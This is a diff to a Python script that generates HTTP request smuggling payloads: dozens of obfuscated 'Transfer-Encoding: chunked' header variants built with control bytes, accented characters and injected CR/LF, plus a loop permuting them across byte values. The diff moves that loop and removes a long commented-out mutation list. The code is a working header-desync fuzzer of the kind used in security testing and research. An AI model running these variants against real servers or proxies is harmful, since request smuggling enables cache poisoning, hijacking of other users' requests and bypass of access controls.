@@ -49,18 +49,6 @@ def permutation():
 #						mutation["position-%c-list-%02x-i-%02x"%position,element,i]=render_template(template.replace(position,position+element))
 
 #permutation(render_template)
-
-result=permutation()
-#print(result)
-for i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:
-	for each in result:
-#		print(each)
-#		mutacao=each.translate ({ord(c): " " for c in "!@#$%^&*()[]{};:,./<>?\|`~-=_+"})
-#		print(each)
-#		print(i)
-		mutations[each.replace("\n","0a").replace("\r","0d").replace("\t","09").replace("%c","%02x"%i).replace(" ","20")] = render_template(each.replace("%c","%c"%i))
-
-
 mutations["vanilla"] = render_template("Transfer-Encoding: chunked")
 mutations["connection"] = render_template("Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked")
 mutations["nameprefix1"] = render_template(" Transfer-Encoding: chunked")
@@ -91,52 +79,10 @@ mutations["accentCH"] = render_template("Transfer-Encoding: ch\x96nked")
 mutations["accentTE"] = render_template("Transf\x82r-Encoding: chunked")
 mutations["x-rout"] = render_template("X:X\rTransfer-Encoding: chunked")
 mutations["x-nout"] = render_template("X:X\nTransfer-Encoding: chunked")
-#list=["","\r","\n","\t","\r\n"]
-#for i in range(0x1,0xff):
+result=permutation()
+#print(result)
+for i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:
+	for each in result:
+		mutations[each.replace("\n","0a").replace("\r","0d").replace("\t","09").replace("%c","%02x"%i).replace(" ","20")] = render_template(each.replace("%c","%c"%i))
 
-#	for element in list:
 
-
-#	mutations["prefix1-%02x"%i] = render_template("Transfer-Encoding: %cchunked"%(i))
-#	mutations["prefix2-%02x"%i] = render_template("Transfer-Encoding:%c chunked"%(i))
-#	mutations["midspace-%02x"%i] = render_template("Transfer-Encoding:%cchunked"%(i))
-#	mutations["postspace-%02x"%i] = render_template("Transfer-Encoding%c: chunked"%(i))
-#	mutations["prespace-%02x"%i] = render_template("%cTransfer-Encoding: chunked"%(i))
-#	mutations["endspace-%02x"%i] = render_template("Transfer-Encoding: chunked%c"%(i))
-#	mutations["xprespace-%02x"%i] = render_template("X: X%cTransfer-Encoding: chunked"%(i))
-#	mutations["endspacex-%02x"%i] = render_template("Transfer-Encoding: chunked%cX: X"%(i))
-#	mutations["rxprespace-%02x"%i] = render_template("X: X\r%cTransfer-Encoding: chunked"%(i))
-#	mutations["xnprespace-%02x"%i] = render_template("X: X%c\nTransfer-Encoding: chunked"%(i))
-#	mutations["endspacerx-%02x"%i] = render_template("Transfer-Encoding: chunked\r%cX: X"%(i))
-#	mutations["endspacexn-%02x"%i] = render_template("Transfer-Encoding: chunked%c\nX: X"%(i))
-#	mutations["XX-%02x-%02x-XX"%(i,i)] = render_template("Transfer-Encoding%c:%cchunked"%(i,i))
-#	mutations["%02x-%02x-XX-XX"%(i,i)] = render_template("%cTransfer-Encoding%c: chunked"%(i,i))
-#	mutations["%02x-XX-%02x-XX"%(i,i)] = render_template("%cTransfer-Encoding:%cchunked"%(i,i))
-#	mutations["random-%02x-XX-%02x-XX"%(i,i)] = render_template("%cTransfer-Encoding: %cchunked"%(i,i))
-#	mutations["%02x-XX-XX-%02x"%(i,i)] = render_template("%cTransfer-Encoding: chunked%c"%(i,i))
-#	mutations["XX-%02x-%02x-XX"%(i,i)] = render_template("Transfer-Encoding%c:%cchunked"%(i,i))
-#	mutations["random-%02x-XX-%02x-XX"%(i,i)] = render_template("Transfer-Encoding%c: %cchunked"%(i,i))
-#	mutations["XX-%02x-XX-%02x"%(i,i)] = render_template("Transfer-Encoding%c: chunked%c"%(i,i))
-#	mutations["XX-XX-%02x-%02x"%(i,i)] = render_template("Transfer-Encoding:%cchunked%c"%(i,i))
-#
-#for i in range(0x7F,0x100):
-#	mutations["prefix1-%02x"%i] = render_template("Transfer-Encoding: %cchunked"%(i))
-#	mutations["prefix2-%02x"%i] = render_template("Transfer-Encoding:%c chunked"%(i))
-#	mutations["midspace-%02x"%i] = render_template("Transfer-Encoding:%cchunked"%(i))
-#	mutations["postspace-%02x"%i] = render_template("Transfer-Encoding%c: chunked"%(i))
-#	mutations["prespace-%02x"%i] = render_template("%cTransfer-Encoding: chunked"%(i))
-#	mutations["endspace-%02x"%i] = render_template("Transfer-Encoding: chunked%c"%(i))
-#	mutations["xprespace-%02x"%i] = render_template("X: X%cTransfer-Encoding: chunked"%(i))
-#	mutations["endspacex-%02x"%i] = render_template("Transfer-Encoding: chunked%cX: X"%(i))
-#	mutations["rxprespace-%02x"%i] = render_template("X: X\r%cTransfer-Encoding: chunked"%(i))
-#	mutations["xnprespace-%02x"%i] = render_template("X: X%c\nTransfer-Encoding: chunked"%(i))
-#	mutations["endspacerx-%02x"%i] = render_template("Transfer-Encoding: chunked\r%cX: X"%(i))
-#	mutations["endspacexn-%02x"%i] = render_template("Transfer-Encoding: chunked%c\nX: X"%(i))
-#	mutations["%02x-%02x-XX-XX"%(i,i)] = render_template("%cTransfer-Encoding%c: chunked"%(i,i))
-#	mutations["%02x-XX-%02x-XX"%(i,i)] = render_template("%cTransfer-Encoding:%cchunked"%(i,i))
-#	mutations["random-%02x-XX-%02x-XX"%(i,i)] = render_template("%cTransfer-Encoding: %cchunked"%(i,i))
-#	mutations["%02x-XX-XX-%02x"%(i,i)] = render_template("%cTransfer-Encoding: chunked%c"%(i,i))
-#	mutations["XX-%02x-%02x-XX"%(i,i)] = render_template("Transfer-Encoding%c:%cchunked"%(i,i))
-#	mutations["random-%02x-XX-%02x-XX"%(i,i)] = render_template("Transfer-Encoding%c: %cchunked"%(i,i))
-#	mutations["XX-%02x-XX-%02x"%(i,i)] = render_template("Transfer-Encoding%c: chunked%c"%(i,i))
-##	mutations["XX-XX-%02x-%02x"%(i,i)] = render_template("Transfer-Encoding:%cchunked%c"%(i,i))
